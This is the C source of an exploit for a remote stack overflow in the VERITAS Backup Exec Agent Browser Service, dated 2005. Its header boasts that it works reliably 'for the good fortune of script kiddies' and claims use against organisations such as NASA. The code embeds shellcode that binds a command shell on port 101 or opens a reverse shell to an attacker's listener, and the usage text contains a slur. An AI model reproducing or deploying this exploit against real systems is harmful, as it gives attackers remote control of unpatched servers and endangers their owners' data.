/*
VERITAS Backup Exec v9.1.4691.SP1
                    v9.1.4691.SP0
     v8.5.3572
Agent Browser Service, Remote Stack Overflow

Highly Critical

All credits to:

-iDEFENSE(discovery-www.iDEFENSE.com),
-Thor Doomen(iat-syscall[at]inbox.lv),
-H.D. Moore(scode-www.metasploit.com),
-Matt Miller(scode-www.hick.org)

ExtraNotes:

All my tests/debugs where a bit long (some days) firstly due to the big size
of Backup Exec and the unstability accross differents windows versions
to make working that IAT method with 100% success and the difficulty to
debug it.
(As a recall, due to the 60 bytes only free, a tiny shellcode is send in
first to scan
the recv function of benetns.exe and jump to the data submitted during the
second send,
thanx syscall. Let's think large now. Imagine that you exploits the hole and
you submit
the shellcode 5 minutes later, the service will hang on to death of course
until a kill,
now imagine that you exploits the hole and you submit the shellcode too
faslty for the,
computer processing, the shellcode can be missed, wont be executed again,
sometimes yes/no, but really unstable.
Hopefully (or unfortunely for you admin :>) I'm here to optimize it and make
it 100% working, universal,
stable whatever you want for the good fortune of script kiddies and to show
what mean working to my good
friends ka-odick :>
                                                 Tries
   Machine           Bind  / Rverse / Success

 (2x) Win2k SP4   Server English      10        10       20
 (1x) Win2k SP4   Pro    English       5         5       10
 (1x) WinXP SP1   Pro    English       5         5       10
 (1x) WinXP SP1a  Pro    English       5         5       10
 (3x) Win2003 SP0 Server English       5         5       10
 (1x) Win2003 SP0 Server Ita.          5         5       10
 (1x) NT4         Server English.      5         5       10

            = Universal

v0.1:
C code based on Thor Doomen's code posted at the metasploit mailing list,
excellent in the method, but super unstable to not say not working when
used,
made some changes.

v0.2:
fix of the first big problem , the missed shellcode accross differents
windows,
fixed by flooding benetns with more sends, timer really small, this is
important.
padding 1 nop to the reverse shellcode as needed, else crash on reverse.

v0.3:
universal esi call across v9.1 SP0 and SP1, for the good fortune of script
kiddies.

v0.4:
As a warning, this poc v0.4 as been tested working by an anonymous tester
(never mentionned there)
on some organisations such nasa, states/edus, it's urgent to update 1 month
after the advisory, sleepers.

Tips: -make sure that your ip is safe of null bytes in reverse mode.
      -make sure that you targets the good version of Backup Exec,
      else you crash it.
   -Backup Exec v10.0 is now available, get it at www.veritas.com.
   -Visit dfind.kd-team.com for a patched benetns.exe, quick solution
   for an urgent update. (extracted from the hotfix at www.veritas.com)
      Backup Exec 9.x is tested safe after replacing the .exe

Greetings:
   Nima Majidi
   Behrang Fouladi
   Pejman
   keystr0ke
   JGS
   DiabloHorn
   kimatrix
   NaV
   New Metasploit v2.3 (http://www.metasploit.com/)
   and all idlers of #n3ws on Eris Free Network.

by class101 [at] hat-squad.com
answering to all stupid questions that I got & will have, no I'm not persian
and you don't care where I come from.

04 January 2005
*/
#include <stdio.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif

char scode1[]=
file://Matt Millers 'skape' shellcode.
"\x90"  // pad needed their for me, if you get scode detection problems on
slow connections,
file://try to add more NOP and make sure to update the memcpys later in the
code.
"\xeb\x6e\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0d\x56\x8b\x40\x0c\x8b\x70\x1
c\xad"
"\x8b\x40\x08\x5e\xc3\x8b\x40\x34\x83\xc0\x7c\x8b\x40\x3c\xc3\x60\x8b\x6c\x2
4\x24"
"\x8b\x45\x3c\x8b\x7c\x05\x78\x03\xfd\x8b\x4f\x18\x8b\x5f\x20\x03\xdd\xe3\x3
3\x49"
"\x8b\x34\x8b\x03\xf5\x33\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x03\xd
0\xeb"
"\xf4\x3b\x54\x24\x28\x75\xe2\x8b\x5f\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5f\x1
c\x03"
"\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c\x61\xc3\xeb\x35\xad\x50\x52\xe8\xa
9\xff"
"\xff\xff\x89\x07\x83\xc4\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3\x8e\x4e\x0e\xe
c\x72"
"\xfe\xb3\x16\x7e\xd8\xe2\x73\xad\xd9\x05\xce\xd9\x09\xf5\xad\xec\xf9\xaa\x6
0\xcb"
"\xed\xfc\x3b\xe7\x79\xc6\x79\x83\xec\x60\x8b\xec\xeb\x02\xeb\x05\xe8\xf9\xf
f\xff"
"\xff\x5e\xe8\x47\xff\xff\xff\x8b\xd0\x83\xee\x2e\x8d\x7d\x04\x8b\xce\x83\xc
1\x10"
"\xe8\xa5\xff\xff\xff\x83\xc1\x10\x33\xc0\x66\xb8\x33\x32\x50\x68\x77\x73\x3
2\x5f"
"\x8b\xdc\x51\x52\x53\xff\x55\x04\x5a\x59\x8b\xd0\xe8\x85\xff\xff\xff\xb8\x0
1\x63"
"\x6d\x64\xc1\xf8\x08\x50\x89\x65\x30\x33\xc0\x66\xb8\x90\x01\x2b\xe0\x54\x8
3\xc0"
"\x72\x50\xff\x55\x1c\x33\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\x55\x14\x8
b\xf0"
"\x68\x7f\x01\x01\x01\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x8b\xdc\x33\xc0\xb0\x1
0\x50"
"\x53\x56\xff\x55\x18\x33\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33\xc0\xf3\xaa\x5
f\xc6"
"\x07\x44\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f\x38\xab\xab\xab\x5f\x33\xc0\x8d\x7
7\x44"
"\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50\xff\x75\x30\x50\xff\x55\x08\xf7\xd
0\x50"
"\xff\x36\xff\x55\x10\xff\x77\x38\xff\x55\x20\xff\x55\x0c\x90\x90\x90\x90\x9
0\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9
0\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9
0\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9
0\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9
0\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9
0\x90";


char scode2[]=
file://HD.Moore Shellcode
file://"\x90"   uncomment this if you have scode detection problem on slows
connections or try more NOP,
file://but for me and some other guys its already fine like this.
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xF
F\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xD
C\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x6
6\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xA
C\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x0
3\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x9
1\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x0
1\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x8
8\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA
6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA
8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xD
D\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD
8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x0
1\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x0
1\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7
B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x8
9\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD
9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8
C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x7
7\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xD
B\x77"
"\x58\x68\x61\x63\x6B\x90";

static char payload[800];
char v91sp0sp1[]="\xFF\x50\x11\x40";
char esisp0sp1[]="\xA1\xFF\x42\x01";
char v85[]="\xFF\x38\x11\x40";
char esiold[]="\xB9\x08\x43\x01";

char talk[] =
"\x02\x00\x32\x00"
"\x90\x90\x90\x90"
"\x31\xF6\xC1\xEC\x0C\xC1\xE4\x0C\x89\xE7\x89\xFB\x6A\x01\x8B\x74"
"\x24\xFE\x31\xD2\x52\x42\xC1\xE2\x10\x52\x57\x56\xB8\x00\x00\x00"
"\x00\xC1\xE8\x08\xFF\x10\x85\xC0\x79\x07\x89\xDC\x4E\x85\xF6\x75"
"\xE1\xFF\xE7\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x00"
"1.1.1.1.1.1"
"\x00"
"\xEB\x80";

#ifdef WIN32
 WSADATA wsadata;
#endif

void ver();
void usage(char* us);

int main(int argc,char *argv[])
{
 ver();
 unsigned long gip;
 unsigned short gport;
 char *os;
 if
(argc>6||argc<3||atoi(argv[1])>2||atoi(argv[1])<1){usage(argv[0]);return -1;
}
 if (argc==5){usage(argv[0]);return -1;}
    if (strlen(argv[2])<7){usage(argv[0]);return -1;}
    if (argc==6)
 {
        if (strlen(argv[4])<7){usage(argv[0]);return -1;}
 }
#ifndef WIN32
 if (argc==6)
 {
   gip=inet_addr(argv[4])^(long)0x00000000;
  gport=htons(atoi(argv[5]))^(short)0x0000;
 }
#define Sleep  sleep
#define SOCKET  int
#define closesocket(s) close(s)
#else
 if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup
error\n");return -1;}
 if (argc==6)
 {
  gip=inet_addr(argv[4])^(ULONG)0x00000000;
  gport=htons(atoi(argv[5]))^(USHORT)0x0000;
 }
#endif
 int ip=htonl(inet_addr(argv[2])), port;
 if (argc==4||argc==6){port=atoi(argv[3]);} else port=6101;
 SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
 s=socket(AF_INET,SOCK_STREAM,0);
 if (s==-1){printf("[+] socket() error\n");return -1;}
 if (atoi(argv[1])==1) {memcpy(&talk[37], &v91sp0sp1, 4);memcpy(&talk[72],
&esisp0sp1, 4);os="Backup Exec v9.1.4691.1\n[+]            Backup Exec
v9.1.4691.0";}
 else {memcpy(&talk[37], &v85, 4);memcpy(&talk[72], &esiold, 4);os="Backup
Exec v8.5.3572";}
 if (argc==6)
 {
  memcpy(&scode1[282], &gip, 4);
  memcpy(&scode1[289], &gport, 2);
  strcat(payload,scode1);
 }
 else strcat(payload,scode2);
 printf("[+] target(s): %s\n",os);
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=htonl(ip);
 server.sin_port=htons(port);
 connect(s,( struct sockaddr *)&server,sizeof(server));
 timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
 switch(select(s+1,NULL,&mask,NULL,&timeout))
 {
  case -1: {printf("[+] select() error\n");closesocket(s);return -1;}
  case 0: {printf("[+] connect() error\n");closesocket(s);return -1;}
  default:
  if(FD_ISSET(s,&mask))
  {
   printf("[+] connected, constructing the payload...\n");
   if (send(s,talk,sizeof(talk)-1,0)==-1) { printf("[+] sending error 1, the
server prolly rebooted.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif
   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 2,
the server is patched.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif

   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 3,
the server is patched.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif

   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 4,
the server is patched.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif

   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 5,
the server is patched.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif
   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 6,
the server is patched.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif
   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 7,
the server is patched.\n");return -1;}

#ifdef WIN32
   Sleep(10);
#else
   Sleep(1/100);
#endif
   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 8,
the server is patched.\n");return -1;}
#ifdef WIN32
   Sleep(1000);
#else
   Sleep(1);
#endif
   printf("[+] size of payload: %d\n",(sizeof(talk)-1)+strlen(payload)*7);
   printf("[+] payload sent.\n");
   return 0;
  }
 }
 closesocket(s);
#ifdef WIN32
 WSACleanup();
#endif
 return 0;
}


void usage(char* us)
{
 printf("USAGE:\n");
 printf("      [+]  . 101_BXEC.exe Version VulnIP\n");
 printf("      [+]  . 101_BXEC.exe Version VulnIP VulnPORT\n");
 printf("      [+]  . 101_BXEC.exe Version VulnIP VulnPORT GayIP
GayPORT\n");
 printf("VERSION:                               \n");
 printf("      [+] 1. Backup Exec v9.1.4691.SP1\n");
 printf("      [+] 1. Backup Exec v9.1.4691.SP0\n");
 printf("      [+] 2. Backup Exec v8.5.3572\n");
 printf("TARGET:                               \n");
 printf("      [+]  . 2k3/2k/XP/NT4 universal (*)\n");
 printf("NOTE:                               \n");
 printf("      The exploit bind a cmdshell port 101 or\n");
 printf("      reverse a cmdshell on your listener.\n");
 printf("      A wildcard (*) mean tested working.\n");
 printf("      Compilation msvc6, cygwin, Linux.\n");
 return;
}
void ver()
{
 printf("
\n");
 printf("
================================================[0.4]========\n");
 printf("        =================VERITAS Backup Exec
8.x/9.x=================\n");
 printf("        =========Agent Browser Service, Remote Stack
Overflow========\n");
 printf("        ======coded by class101=============[Hat-Squad.com
2005]=====\n");
 printf("
=============================================================\n");
 printf("
\n");
}
